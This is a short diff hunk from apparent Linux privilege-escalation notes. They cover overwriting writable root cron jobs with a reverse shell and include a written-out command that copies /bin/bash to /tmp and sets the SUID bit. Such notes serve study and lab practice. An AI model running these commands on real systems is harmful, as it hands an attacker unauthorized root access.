@@ -152,8 +152,7 @@ Any user can read the file keeping system-wide cron jobs under /etc/crontab - ca
 Edit any cron jobs that have permission and replace with a reverse shell using nano filename then edit. Ensure it runs as root.<br>
 <br>
 <br>
-<br>
-Means runs every minute<br>
+5 stars Means runs every minute<br>
 Overwrite file with output such as <br>
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /file/path/ofcron.sh<br>
 chmod +x ofcron.sh<br>
